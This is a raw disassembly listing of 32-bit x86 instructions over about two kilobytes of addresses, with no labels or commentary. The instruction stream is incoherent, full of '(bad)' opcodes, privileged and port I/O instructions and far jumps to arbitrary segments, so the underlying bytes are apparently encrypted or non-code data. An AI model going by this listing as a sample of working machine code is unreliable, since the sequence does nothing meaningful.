  410496:	dec    eax
  410497:	add    esi,DWORD PTR [edx+0xa]
  41049a:	mov    eax,0xf76c34a6
  41049f:	sti    
  4104a0:	es mov ebx,0x496d837e
  4104a6:	into   
  4104a7:	mov    dl,0x1c
  4104a9:	jge    0x410433
  4104ab:	loop   0x4104ff
  4104ad:	push   ecx
  4104ae:	je     0x410483
  4104b0:	sti    
  4104b1:	fs and edx,ecx
  4104b4:	or     al,0xd0
  4104b6:	mov    ecx,DWORD PTR [eax]
  4104b8:	jge    0x410515
  4104ba:	inc    edx
  4104bb:	sti    
  4104bc:	test   al,0xf5
  4104be:	dec    edx
  4104bf:	cld    
  4104c0:	pusha  
  4104c1:	(bad)  
  4104c2:	ds test eax,0xb7f39bd7
  4104c8:	adc    eax,0x214831ab
  4104cd:	jp     0x4104d4
  4104cf:	xor    DWORD PTR [eax-0x1008f2de],ebp
  4104d5:	popf   
  4104d6:	dec    ecx
  4104d7:	pop    ebx
  4104d8:	cmc    
  4104d9:	ins    BYTE PTR es:[edi],dx
  4104da:	(bad)  
  4104db:	sti    
  4104dc:	aam    0x51
  4104de:	push   es
  4104df:	xchg   ebp,eax
  4104e0:	mov    bh,0x88
  4104e2:	out    0x9e,al
  4104e4:	mov    ?,WORD PTR [ebx-0x6d]
  4104e7:	(bad)  
  4104e8:	call   0x3f4c:0xa22b0fab
  4104ef:	sub    DWORD PTR [edx+0x54],edi
  4104f2:	xor    ebx,DWORD PTR [ebx+0x38]
  4104f5:	jmp    0x4104d7
  4104f7:	out    0xfa,eax
  4104f9:	push   esi
  4104fa:	and    eax,0xbc8778c9
  4104ff:	pusha  
  410500:	push   eax
  410501:	xchg   ebp,eax
  410502:	scas   eax,DWORD PTR es:[edi]
  410503:	ficom  WORD PTR [esi]
  410505:	cmp    edx,DWORD PTR [ebx]
  410507:	int    0x76
  410509:	mov    bh,0x68
  41050b:	ins    DWORD PTR es:[edi],dx
  41050c:	retf   
  41050d:	xor    eax,DWORD PTR [eax-0x7ecc3db2]
  410513:	das    
  410514:	aam    0x86
  410516:	(bad)  
  410517:	fld    QWORD PTR [ecx+0x68247f69]
  41051d:	and    DWORD PTR [edi+0x6ae55a60],ecx
  410523:	loop   0x41055c
  410525:	loop   0x410591
  410527:	add    DWORD PTR [eax+0x336d6ef5],edx
  41052d:	lea    esp,[esi-0x5dc9d37c]
  410533:	and    DWORD PTR [ecx],0x9312feaa
  410539:	mov    cl,0x2e
  41053b:	ja     0x41055a
  41053d:	inc    esp
  41053e:	mov    cl,0x4b
  410540:	xchg   esp,eax
  410541:	inc    esp
  410542:	or     ebp,DWORD PTR [ecx-0x69]
  410545:	dec    ecx
  410546:	pop    ebp
  410548:	in     eax,0x17
  41054a:	adc    eax,0x81cc6872
  41054f:	repz cmp DWORD PTR [ecx],0xffffffa1
  410553:	icebp  
  410554:	mov    WORD PTR [edx+0x44],cs
  410557:	nop
  410558:	cld    
  410559:	pop    ebx
  41055a:	cmp    DWORD PTR [ecx],edx
  41055c:	sbb    ah,BYTE PTR [edx-0x725e1ad8]
  410562:	(bad)  
  410563:	sbb    eax,0x318b30e8
  410568:	cld    
  410569:	fcmovb st,st(0)
  41056b:	sbb    ebx,ebp
  41056d:	shl    DWORD PTR es:[edx-0x64],1
  410571:	out    0x86,eax
  410573:	loopne 0x4105ee
  410575:	mov    al,ds:0xfd55e9d9
  41057a:	cld    
  41057b:	ror    ebp,0x3c
  41057e:	popf   
  41057f:	and    ch,BYTE PTR [edi-0x4590dcc5]
  410585:	sbb    edi,eax
  410587:	fnsave [ebp-0x3a15126]
  41058d:	stos   BYTE PTR es:[edi],al
  41058e:	daa    
  41058f:	jge    0x410587
  410591:	push   ax
  410593:	daa    
  410594:	aam    0xdf
  410596:	xchg   edi,eax
  410597:	and    ebx,DWORD PTR [ebp-0x10]
  41059a:	lods   eax,DWORD PTR ds:[esi]
  41059b:	pop    esi
  41059c:	mov    dl,BYTE PTR [edx+edx*8-0x36d95c42]
  4105a3:	faddp  st(5),st
  4105a5:	add    BYTE PTR [esi],cl
  4105a7:	loope  0x410597
  4105a9:	xchg   ebp,eax
  4105aa:	push   0xffffffee
  4105ac:	dec    esi
  4105ad:	in     al,0xd4
  4105af:	jl     0x4105bb
  4105b1:	sti    
  4105b2:	mov    ebp,0xedf17bc0
  4105b7:	hlt    
  4105b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105b9:	add    al,0x97
  4105bb:	mov    eax,ds:0xb3736c61
  4105c0:	sub    edi,esp
  4105c2:	or     ebp,ebp
  4105c4:	push   0xa194262b
  4105c9:	xor    eax,esp
  4105cb:	xchg   esp,eax
  4105cc:	fsub   QWORD PTR [esi-0x7938cca2]
  4105d2:	shl    DWORD PTR [ecx],0x7c
  4105d5:	cdq    
  4105d6:	out    0x8e,eax
  4105d8:	and    BYTE PTR [edx-0x658bc573],bh
  4105de:	pop    edi
  4105df:	dec    ebx
  4105e0:	mov    cl,0xdc
  4105e2:	cld    
  4105e3:	xlat   BYTE PTR ds:[ebx]
  4105e4:	add    BYTE PTR [eax+0x58],dh
  4105e7:	lods   al,BYTE PTR ds:[esi]
  4105e8:	loopne 0x41065c
  4105ea:	mov    edx,0xe3e76288
  4105ef:	xchg   ebx,eax
  4105f0:	(bad)  
  4105f1:	call   0x5f85:0x171fecc8
  4105f8:	mov    cl,0x6d
  4105fa:	mov    cl,0xa5
  4105fc:	jge    0x4105cc
  4105fe:	xchg   DWORD PTR [eax],esp
  410600:	dec    eax
  410601:	add    bh,BYTE PTR [eax+0x4f]
  410604:	call   0xac9e:0xd6f159cd
  41060b:	(bad)  
  41060c:	xchg   edx,eax
  41060d:	lds    edi,FWORD PTR [edi-0x15]
  410610:	and    eax,0xca15b0bd
  410615:	inc    esp
  410616:	xchg   ebx,eax
  410617:	mov    bh,0x94
  410619:	(bad)  
  41061a:	sbb    eax,ebx
  41061c:	lock cmp bl,bh
  41061f:	(bad)  
  410620:	fcmove st,st(4)
  410622:	sub    esi,DWORD PTR [esi+0x10f39d98]
  410628:	inc    esi
  410629:	into   
  41062a:	iret   
  41062b:	mov    cl,0xda
  41062d:	dec    ebp
  41062e:	mov    ah,0xda
  410630:	xchg   esp,eax
  410631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410632:	fwait
  410633:	movzx  esi,BYTE PTR [ebx+ebp*8]
  410637:	fistp  WORD PTR [edi+0xf]
  41063a:	pop    eax
  41063b:	shl    BYTE PTR [edx+0x59b46b07],1
  410641:	push   ecx
  410642:	sar    BYTE PTR [eax+eiz*2-0x4d],cl
  410646:	into   
  410647:	xor    edi,eax
  410649:	xor    al,0xc3
  41064b:	pop    ecx
  41064c:	and    BYTE PTR [ebp-0x1d],ah
  41064f:	pop    eax
  410650:	aaa    
  410651:	cmp    al,0x4a
  410653:	push   ebx
  410654:	xchg   esi,eax
  410655:	mov    al,ds:0xaae545c9
  41065a:	(bad)  
  41065b:	mov    DWORD PTR [ebx-0xeda6d0a],0x7a4fc462
  410665:	xor    ah,BYTE PTR [esi-0x70]
  410668:	retf   
  410669:	and    DWORD PTR [ebp+ebx*1+0x7],ecx
  41066d:	pop    esi
  41066e:	repnz fnstsw WORD PTR [ebx+0x4a632463]
  410675:	adc    edi,DWORD PTR [eax-0x11363bf7]
  41067b:	add    eax,0x5c65fcee
  410680:	mov    edx,0xff3035ba
  410685:	ficom  WORD PTR [ebx+0x51ae359]
  41068b:	psubusw mm1,QWORD PTR [ebp-0x71]
  41068f:	fisubr WORD PTR [ecx+0x596a3d8d]
  410695:	(bad)  [eax]
  410697:	mov    esp,0xd2bbc090
  41069c:	mov    bh,0xc7
  41069e:	jnp    0x41062e
  4106a0:	bound  eax,QWORD PTR [esi]
  4106a2:	pop    ds
  4106a3:	mov    ds:0x23717933,al
  4106a8:	sbb    DWORD PTR [edi-0x20983792],edi
  4106ae:	js     0x4106c8
  4106b0:	push   cs
  4106b1:	adc    ebp,DWORD PTR ds:0xa7b617b0
  4106b7:	cmc    
  4106b8:	dec    edx
  4106b9:	shl    BYTE PTR [edx],cl
  4106bb:	and    edx,esp
  4106bd:	sub    ebp,DWORD PTR [ebx]
  4106bf:	push   eax
  4106c0:	stos   BYTE PTR es:[edi],al
  4106c1:	adc    BYTE PTR [ebx],dl
  4106c3:	call   0xee264d0b
  4106c8:	mov    dh,0x25
  4106ca:	jbe    0x4106ed
  4106cc:	pushf  
  4106cd:	shl    BYTE PTR [edi],cl
  4106cf:	add    DWORD PTR [ebx],edx
  4106d1:	add    cl,BYTE PTR [esi-0x60]
  4106d4:	mov    ebp,0xf1a7d3c8
  4106d9:	aaa    
  4106da:	stos   BYTE PTR es:[edi],al
  4106db:	dec    ecx
  4106dc:	div    BYTE PTR [esi-0x6]
  4106df:	leave  
  4106e0:	xor    eax,eax
  4106e2:	into   
  4106e3:	imul   ebp,DWORD PTR [edx+esi*8],0x14
  4106e7:	cmp    BYTE PTR [ecx],0x2f
  4106ea:	fdivr  QWORD PTR [edi+0x55]
  4106ed:	into   
  4106ee:	add    dh,al
  4106f0:	shr    BYTE PTR [edi-0x3b],1
  4106f3:	into   
  4106f4:	pop    edi
  4106f5:	pop    ds
  4106f6:	xchg   esi,eax
  4106f7:	scas   eax,DWORD PTR es:[edi]
  4106f8:	in     al,dx
  4106f9:	pop    edi
  4106fa:	je     0x41072b
  4106fc:	sub    al,0xde
  4106fe:	ss xor eax,0xe3a7d4f3
  410704:	lahf   
  410705:	in     eax,0xec
  410707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410708:	sbb    edi,ecx
  41070a:	add    ebp,DWORD PTR [edi+0x5574998d]
  410710:	dec    eax
  410711:	mov    eax,0xa9b32ee1
  410716:	(bad)  
  410718:	dec    esi
  410719:	sti    
  41071a:	pop    edx
  41071b:	sbb    BYTE PTR [ecx],0x6c
  41071e:	out    dx,al
  41071f:	jnp    0x41079d
  410721:	mov    al,0xde
  410723:	xor    edi,ebp
  410725:	xchg   ebx,eax
  410726:	cwde   
  410727:	mov    ecx,ecx
  410729:	sub    al,0x74
  41072b:	push   ds
  41072c:	adc    eax,0xa8443fb6
  410731:	fadd   DWORD PTR [eax+ebp*8+0x6646d8eb]
  410738:	fmul   QWORD PTR [esi]
  41073a:	push   ecx
  41073b:	pop    ebp
  41073c:	fadd   QWORD PTR [eax+0x48]
  41073f:	push   cs
  410740:	xchg   ebp,eax
  410741:	sbb    ebp,DWORD PTR [eax-0x7c351e5c]
  410747:	or     eax,0x8801ebe5
  41074c:	or     DWORD PTR [ecx-0x71],0x6f4b17a0
  410753:	call   0x5656:0x96ebe22b
  41075a:	pusha  
  41075b:	add    bl,BYTE PTR [ebx+0x2e]
  41075e:	sub    dl,BYTE PTR [ecx]
  410760:	clc    
  410761:	push   0x69
  410763:	cmp    DWORD PTR [esi+0x33ee297d],0xa08b855f
  41076d:	or     ebx,ecx
  41076f:	cmc    
  410770:	dec    eax
  410771:	dec    ebp
  410772:	sbb    al,0xd0
  410774:	adc    DWORD PTR [ecx-0x36],ebx
  410777:	push   esi
  410778:	scas   al,BYTE PTR es:[edi]
  410779:	inc    ebx
  41077a:	sub    BYTE PTR [esp+eax*4-0x2f],0x3b
  41077f:	push   ecx
  410780:	and    al,0x0
  410782:	test   BYTE PTR [ebx+eax*8-0x2a4efbf0],bl
  410789:	sub    al,0xed
  41078b:	push   ds
  41078c:	pop    ecx
  41078e:	xchg   esp,eax
  41078f:	pushf  
  410790:	xlat   BYTE PTR ds:[ebx]
  410791:	outs   dx,BYTE PTR ds:[esi]
  410792:	and    dl,bl
  410794:	jmp    0x20919414
  410799:	cmp    BYTE PTR [edi-0x9337eac],dl
  41079f:	lods   eax,DWORD PTR ds:[esi]
  4107a0:	jae    0x410752
  4107a2:	xchg   ebx,eax
  4107a3:	xchg   ecx,eax
  4107a4:	into   
  4107a5:	adc    eax,0xa633c8ba
  4107aa:	mov    edx,edx
  4107ac:	cmp    dh,BYTE PTR [eax+0x2be4ad04]
  4107b2:	and    BYTE PTR [edi+0xe653737],ch
  4107b8:	rcr    DWORD PTR [esi+ebx*1+0x617b3483],0x1d
  4107c0:	cwde   
  4107c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c2:	sti    
  4107c3:	outs   dx,BYTE PTR ds:[esi]
  4107c4:	ror    DWORD PTR [eax-0x59430a43],1
  4107ca:	jmp    FWORD PTR [ecx+ebp*8-0x2c3c7088]
  4107d1:	jne    0x410813
  4107d3:	in     eax,0x6b
  4107d5:	jg     0x4107bb
  4107d7:	ret    
  4107d8:	adc    al,0x4c
  4107da:	jo     0x410800
  4107dc:	inc    esi
  4107dd:	rcr    BYTE PTR [ecx+0x5b6149fe],0xf
  4107e4:	repnz loop 0x410772
  4107e7:	inc    eax
  4107e8:	test   bh,dl
  4107ea:	out    0xe0,eax
  4107ec:	shl    BYTE PTR [edi],1
  4107ee:	mov    DWORD PTR [edi-0x63aabbdf],ebp
  4107f4:	add    DWORD PTR [eax+0xd],edi
  4107f7:	popf   
  4107f8:	push   0x8e446624
  4107fd:	pop    edi
  4107fe:	mov    ebx,0x8b71364
  410803:	sahf   
  410804:	mov    esp,0xf495cc20
  410809:	mov    edi,0x902a227c
  41080e:	test   DWORD PTR [edi-0x3ea29911],0x1ce1bd7
  410818:	outs   dx,DWORD PTR ds:[esi]
  410819:	jae    0x410898
  41081b:	call   0x2a267ae1
  410820:	dec    eax
  410821:	push   0xffffffea
  410823:	jno    0x41082b
  410825:	loop   0x41085a
  410827:	rol    cl,0xe2
  41082a:	push   ds
  41082b:	mov    DWORD PTR [ebp+0x10],eax
  41082e:	jmp    0x410db8
  410833:	mov    DWORD PTR [edi],ebx
  410835:	adc    al,0xee
  410837:	sbb    ah,ah
  410839:	cmp    BYTE PTR [ecx],bl
  41083b:	jne    0x4107e5
  41083d:	es je  0x4107de
  410840:	dec    ebp
  410841:	mov    al,0xae
  410843:	ins    BYTE PTR es:[edi],dx
  410844:	push   esp
  410845:	push   ss
  410846:	push   ss
  410847:	cmp    eax,0x39161604
  41084c:	out    0xc1,eax
  41084e:	sub    eax,0xb28bf569
  410853:	jns    0x410877
  410855:	cli    
  410856:	fstp   TBYTE PTR [edx+0x1e]
  410859:	popf   
  41085a:	test   DWORD PTR [ebp+0x1c],esi
  41085d:	cli    
  41085e:	xchg   ebp,eax
  41085f:	xor    BYTE PTR [ebx+ebp*8],0x79
  410863:	push   ebp
  410864:	mov    ecx,0x95e747ff
  410869:	mov    al,0x9d
  41086b:	fist   WORD PTR [edi]
  41086d:	push   eax
  41086e:	rcl    bh,cl
  410870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410871:	cmp    eax,0xa7274518
  410876:	xchg   ebp,eax
  410877:	adc    DWORD PTR [ecx+edx*4],esi
  41087a:	ds cwde 
  41087c:	imul   ebp,DWORD PTR [ebp-0x57],0xfc4eef9a
  410883:	les    eax,FWORD PTR [edx-0x12]
  410886:	ins    BYTE PTR es:[edi],dx
  410887:	and    DWORD PTR [ebx],ebp
  410889:	push   ds
  41088a:	cmp    BYTE PTR [esi+0x78],ah
  41088d:	bound  eax,QWORD PTR [esi]
  41088f:	adc    ebp,DWORD PTR [ebx-0x7]
  410892:	dec    esi
  410893:	fist   DWORD PTR [ebx]
  410895:	int3   
  410896:	(bad)  [edi]
  410898:	data16 into 
  41089a:	jae    0x4108a5
  41089c:	and    al,0xcd
  41089e:	js     0x4108bc
  4108a0:	cmc    
  4108a1:	jmp    0x4108ca
  4108a3:	or     BYTE PTR [edi+0x18730b98],0x45
  4108aa:	xor    cl,dl
  4108ac:	mov    bl,0x8a
  4108ae:	std    
  4108af:	mov    eax,0xe5346c45
  4108b4:	mov    al,ds:0x3039a8ce
  4108b9:	xor    al,0x1
  4108bb:	dec    edx
  4108bc:	mov    edi,0xe37ec47a
  4108c1:	sub    eax,0xdd8fee2
  4108c6:	mov    edx,0x1cfe0c20
  4108cb:	(bad)  
  4108cc:	(bad)  
  4108cd:	xchg   esp,eax
  4108ce:	sub    al,0xc6
  4108d0:	mov    ds:0xbe72748a,eax
  4108d5:	mov    edi,0x3b9f404e
  4108da:	(bad)  
  4108db:	xor    al,BYTE PTR gs:[edx]
  4108de:	mov    ds:0x40b0d9ef,al
  4108e3:	push   cs
  4108e4:	pop    edx
  4108e5:	dec    esi
  4108e6:	test   BYTE PTR [ebx],dh
  4108e8:	imul   ebx,DWORD PTR [ebp-0x1c],0xffffff8e
  4108ec:	and    BYTE PTR [ebp-0x50],ch
  4108ef:	pop    ds
  4108f0:	mov    bh,0xa6
  4108f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108f3:	push   cs
  4108f4:	cld    
  4108f5:	loop   0x4108bc
  4108f7:	sahf   
  4108f8:	pusha  
  4108f9:	or     al,0xa8
  4108fb:	mov    dl,0xe0
  4108fd:	push   ds
  4108fe:	aad    0xfd
  410900:	push   ss
  410901:	call   0x8edc3c3e
  410906:	inc    ebx
  410907:	push   0xfffffffd
  410909:	or     ch,dl
  41090b:	sbb    dl,BYTE PTR [edx-0x2c]
  41090e:	jge    0x410922
  410910:	loop   0x4108d0
  410912:	jl     0x4108b0
  410914:	rcr    DWORD PTR [edi+0x6c],0xb9
  410918:	xchg   ebx,eax
  410919:	mov    ds:0x905995da,eax
  41091e:	push   edi
  41091f:	push   esi
  410920:	cmc    
  410921:	dec    ebx
  410922:	fistp  QWORD PTR [edx-0x55]
  410925:	jmp    0x6b859d7d
  41092a:	(bad)  
  41092b:	push   ds
  41092c:	mov    ah,0x30
  41092e:	cli    
  41092f:	mov    ebp,0x76e80f18
  410934:	jmp    0xee7c1411
  410939:	stc    
  41093a:	jnp    0x41096b
  41093c:	xor    DWORD PTR [edi+0xfe22f6],ebp
  410942:	inc    edi
  410943:	in     al,dx
  410944:	fisub  WORD PTR [ebp+0x7037bc5e]
  41094a:	les    edx,FWORD PTR [edx-0x6d5c3f3b]
  410950:	test   eax,0x21a363d7
  410955:	outs   dx,DWORD PTR es:[esi]
  410957:	push   esi
  410958:	mov    cl,0x60
  41095a:	outs   dx,BYTE PTR ds:[esi]
  41095b:	sbb    ch,dl
  41095d:	or     DWORD PTR [edi-0x10fc29be],0x19
  410964:	repz push ecx
  410966:	addr16 out 0x89,eax
  410969:	pop    ecx
  41096a:	int3   
  41096b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41096c:	push   cs
  41096d:	ror    BYTE PTR ss:[ecx],1
  410970:	cli    
  410971:	(bad)  
  410972:	push   ecx
  410973:	jecxz  0x41091d
  410975:	push   ss
  410976:	data16 mov al,ds:0xc91ea6c9
  41097c:	jg     0x41095e
  41097e:	xor    DWORD PTR [di-0x6156],esi
  410983:	mov    esi,0x71bf0bdb
  410988:	xchg   edi,eax
  410989:	mov    ds:0xbe5996d0,eax
  41098e:	int    0x88
  410990:	dec    eax
  410991:	dec    edx
  410992:	or     BYTE PTR [eax],dl
  410994:	jbe    0x41097b
  410996:	sub    bh,al
  410998:	fld    DWORD PTR [ecx+edx*4+0x68]
  41099c:	push   ss
  41099d:	xchg   DWORD PTR [edi+0x53],eax
  4109a0:	add    DWORD PTR [ecx],edi
  4109a2:	ins    BYTE PTR es:[edi],dx
  4109a3:	les    ebp,FWORD PTR [esi+0x2cb73284]
  4109a9:	mov    al,0xc4
  4109ab:	das    
  4109ac:	pop    esp
  4109ad:	int3   
  4109ae:	loopne 0x410958
  4109b0:	ret    
  4109b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109b2:	sbb    ecx,DWORD PTR [eax-0x7c850620]
  4109b8:	out    dx,eax
  4109b9:	or     al,0xf3
  4109bb:	mov    ebp,0xab0ee2ff
  4109c0:	adc    DWORD PTR [ebx],esp
  4109c2:	retf   
  4109c3:	test   al,0xfa
  4109c5:	jbe    0x410988
  4109c7:	pop    ebx
  4109c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c9:	push   es
  4109ca:	mov    bh,0x36
  4109cc:	or     eax,0x4f1c0685
  4109d1:	pop    ss
  4109d2:	inc    ebp
  4109d3:	ret    0xe6
  4109d6:	inc    esi
  4109d7:	aas    
  4109d8:	icebp  
  4109d9:	sbb    BYTE PTR [esi],ch
  4109db:	popf   
  4109dc:	inc    ecx
  4109dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109de:	pop    esi
  4109df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109e0:	pop    ss
  4109e1:	and    eax,0x1a9f3965
  4109e6:	jmp    0x32b2:0xf0905549
  4109ed:	jg     0x410a10
  4109ef:	js     0x410973
  4109f1:	add    BYTE PTR [ecx+0x16],bh
  4109f4:	iret   
  4109f5:	jns    0x4109e5
  4109f7:	cld    
  4109f8:	sbb    al,0xd0
  4109fa:	inc    edx
  4109fb:	inc    edi
  4109fc:	test   DWORD PTR [eax-0x684c3657],esp
  410a02:	pop    ebx
  410a03:	xor    al,0xb4
  410a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a07:	ds fs pop esi
  410a0a:	mov    ah,0x53
  410a0c:	pop    ss
  410a0d:	lock or dl,dh
  410a10:	outs   dx,DWORD PTR ds:[esi]
  410a11:	rol    DWORD PTR ss:[esi+0x5e61fa89],1
  410a18:	retf   0x7225
  410a1b:	xchg   bh,cl
  410a1d:	inc    esp
  410a1e:	mov    edx,0xf3390e9d
  410a23:	mov    ebp,0xd41146fe
  410a28:	sub    ecx,ebx
  410a2a:	jp     0x410a88
  410a2c:	xchg   ebp,eax
  410a2d:	dec    ebx
  410a2e:	and    eax,0x9ea4aa4
  410a33:	ins    BYTE PTR es:[edi],dx
  410a34:	xchg   esp,eax
  410a35:	dec    ecx
  410a36:	add    DWORD PTR [edi-0x42],esp
  410a39:	mov    al,0xd2
  410a3b:	jmp    0x410aa1
  410a3d:	xchg   esi,eax
  410a3e:	add    BYTE PTR [eax+eax*4],cl
  410a41:	in     al,dx
  410a42:	push   es
  410a43:	dec    DWORD PTR [ebp+0x16265fd1]
  410a49:	pop    ebp
  410a4a:	mul    BYTE PTR [eax-0x27afa2cd]
  410a50:	in     eax,dx
  410a51:	and    al,0xa
  410a53:	mov    ebx,0x168c96db
  410a58:	xchg   ebx,eax
  410a59:	inc    edx
  410a5a:	mov    al,ds:0x9f79e81
  410a5f:	(bad)  
  410a61:	ja     0x410a2f
  410a63:	int    0xd4
  410a65:	and    esi,DWORD PTR [edi+esi*8-0xc645d7c]
  410a6c:	xchg   ecx,eax
  410a6d:	loope  0x410a72
  410a6f:	(bad)  
  410a70:	aad    0xa
  410a72:	lods   al,BYTE PTR ds:[esi]
  410a73:	loopne 0x410aa4
  410a75:	int3   
  410a76:	leave  
  410a77:	imul   ebp,DWORD PTR [edi-0x27a6ca67],0xffffffb1
  410a7e:	add    edi,eax
  410a80:	popa   
  410a81:	pop    edx
  410a82:	xor    ah,BYTE PTR [esi+0x41]
  410a85:	shl    BYTE PTR [esi-0x42f6b7d2],cl
  410a8b:	mov    BYTE PTR [ebp+0x5fa5a6d7],dh
  410a91:	push   esp
  410a92:	cmp    ch,BYTE PTR [ebp+0x2f0b389c]
  410a98:	std    
  410a99:	add    DWORD PTR [esi+0x41528f08],eax
  410a9f:	shl    BYTE PTR [esi-0x3],0x62
  410aa3:	xchg   edi,eax
  410aa4:	dec    ecx
  410aa5:	lds    ebx,FWORD PTR [edx]
  410aa7:	int3   
  410aa8:	hlt    
  410aa9:	xchg   edi,eax
  410aaa:	pop    ebp
  410aab:	adc    ch,BYTE PTR [edi+edi*1-0x21]
  410aaf:	ret    0xde74
  410ab2:	imul   ebp,DWORD PTR [ebp+0x37],0xf53f51ef
  410ab9:	mov    edx,0xad1833ac
  410abe:	inc    esp
  410abf:	leave  
  410ac0:	push   ecx
  410ac1:	sbb    edi,DWORD PTR [edi]
  410ac3:	bound  edx,QWORD PTR [edi+0x55246108]
  410ac9:	sub    DWORD PTR [edx],ecx
  410acb:	mov    esp,0x3c082ba2
  410ad0:	repz imul ecx,DWORD PTR [ecx+0x10],0xffffffd9
  410ad5:	daa    
  410ad6:	into   
  410ad7:	xor    BYTE PTR [esi+0xe],cl
  410ada:	mov    esp,0x92851379
  410adf:	cmp    ebp,eax
  410ae1:	cmc    
  410ae2:	mov    ebx,0x4104a160
  410ae7:	mov    BYTE PTR [edx+0x481a5bc3],ch
  410aed:	xchg   ebx,eax
  410aee:	test   al,0xca
  410af0:	neg    DWORD PTR [eax-0x60d842ea]
  410af6:	das    
  410af7:	xchg   ebx,eax
  410af8:	(bad)  
  410af9:	push   ebx
  410afa:	jle    0x410b73
  410afc:	scas   eax,DWORD PTR es:[di]
  410afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aff:	test   eax,0x893267eb
  410b04:	fldcw  WORD PTR [edx]
  410b06:	add    ebp,DWORD PTR [ecx]
  410b08:	ret    
  410b09:	add    eax,0xf5fb8163
  410b0e:	jmp    0x8d9b20b
  410b13:	pop    es
  410b14:	push   edx
  410b15:	mov    dh,0x3c
  410b17:	mov    ds:0x2636afc9,al
  410b1c:	or     ah,BYTE PTR [ebp-0x1b]
  410b1f:	inc    ebx
  410b20:	std    
  410b21:	and    eax,0xd20729b0
  410b26:	pop    ebx
  410b27:	cld    
  410b28:	and    al,0x2
  410b2a:	loop   0x410b1e
  410b2c:	test   BYTE PTR [edi],dl
  410b2e:	mov    esp,0xcb82bea9
  410b33:	nop    DWORD PTR [edi-0x576e64f6]
  410b3a:	jg     0x410b94
  410b3c:	dec    esi
  410b3d:	mov    dl,0x48
  410b3f:	mov    ebx,0x729d678c
  410b44:	rol    DWORD PTR [ecx+ebx*1+0x5f63ab5e],0x98
  410b4c:	cmp    ah,cl
  410b4e:	dec    ebp
  410b4f:	push   esi
  410b50:	and    BYTE PTR [ecx],bh
  410b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b53:	and    eax,0xd90e532d
  410b58:	and    esi,DWORD PTR ds:0x95761b13
  410b5e:	pop    es
  410b5f:	mov    ebx,0xaa48b330
  410b64:	mov    ebx,0x4a8aa119
  410b69:	cs xchg edx,eax
  410b6b:	lea    eax,[ebp+edx*4-0x2bdb0dfa]
  410b72:	sub    eax,0xe440fb23
  410b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b78:	add    eax,0x393147b3
  410b7d:	(bad)  
  410b7e:	push   ds
  410b7f:	fistp  WORD PTR [ebx]
  410b81:	addr16 or edx,ecx
  410b84:	and    dl,dh
  410b86:	imul   ebx,DWORD PTR [edi+0x4a],0x8779c1af
  410b8d:	ins    BYTE PTR es:[edi],dx
  410b8e:	jecxz  0x410b3b
  410b90:	cld    
  410b91:	rcl    DWORD PTR [ebx+eiz*2-0x69],1
  410b95:	ins    DWORD PTR es:[edi],dx
  410b96:	lds    eax,FWORD PTR [esi]
  410b98:	into   
  410b99:	inc    eax
  410b9a:	pop    es
  410b9b:	sub    al,0xb0
  410b9d:	rcr    DWORD PTR [edi],cl
  410b9f:	inc    ebp
  410ba0:	add    al,0xaf
  410ba2:	(bad)  
  410ba3:	in     al,dx
  410ba4:	mov    eax,DWORD PTR [ebp-0x2d2f9cc]
  410baa:	cmp    dl,BYTE PTR [ecx+ebp*1-0x2b]
  410bae:	jp     0x410bfb
  410bb0:	pop    ss
  410bb1:	pop    ss
  410bb2:	or     esp,eax
  410bb4:	aaa    
  410bb5:	test   eax,0x92070274
  410bba:	arpl   WORD PTR [ebx],di
  410bbc:	hlt    
  410bbd:	std    
  410bbe:	dec    edx
  410bbf:	push   ebp
  410bc0:	adc    ebp,DWORD PTR [esi+edx*1+0x68b8a5ff]
  410bc7:	adc    eax,0x5a4138ab
  410bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bcd:	idiv   bl
  410bcf:	pushf  
  410bd0:	arpl   WORD PTR [ebp-0x20f71642],si
  410bd6:	and    esi,DWORD PTR [ebp-0x2e]
  410bd9:	dec    edi
  410bda:	mov    esp,0xe03a9b54
  410bdf:	arpl   WORD PTR [ecx],bp
  410be1:	cli    
  410be2:	mov    ds:0x1f41b13a,al
  410be7:	in     al,dx
  410be8:	int3   
  410be9:	push   0xfffffff0
  410beb:	or     cl,bh
  410bed:	fcmovnb st,st(5)
  410bef:	mov    dh,0xce
  410bf1:	scas   al,BYTE PTR es:[edi]
  410bf2:	push   esp
  410bf3:	retf   
  410bf4:	push   esi
  410bf5:	jae    0x410c08
  410bf7:	pushf  
  410bf8:	mov    edx,0xbf8ce5b1
  410bfd:	sub    BYTE PTR [edi+0xcb6a87e],bl
  410c03:	push   esp
  410c04:	fld    DWORD PTR [eax-0x12]
  410c07:	mov    esp,0x47ee4890
  410c0c:	jl     0x410c86
  410c0e:	and    eax,0x33ff189c
  410c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c14:	loope  0x410bb4
  410c16:	adc    DWORD PTR [edx-0x7c],edx
  410c19:	jl     0x410c22
  410c1b:	xor    eax,0x3757b51f
  410c20:	stos   DWORD PTR es:[edi],eax
  410c21:	sbb    eax,0xbf3420d5
  410c26:	das    
  410c27:	add    ah,cl
  410c29:	imul   ecx,DWORD PTR [bp+di],0x1c8f373e
  410c30:	adc    al,0x94
  410c32:	inc    esi
  410c33:	lods   al,BYTE PTR ds:[esi]
  410c34:	push   es
  410c35:	inc    ebp
  410c36:	push   DWORD PTR [edx+0x72]
  410c39:	xor    DWORD PTR [esi-0x35],ebx
  410c3c:	add    edx,esi
  410c3e:	xor    edi,DWORD PTR [eax+0x78]
  410c41:	dec    ebp
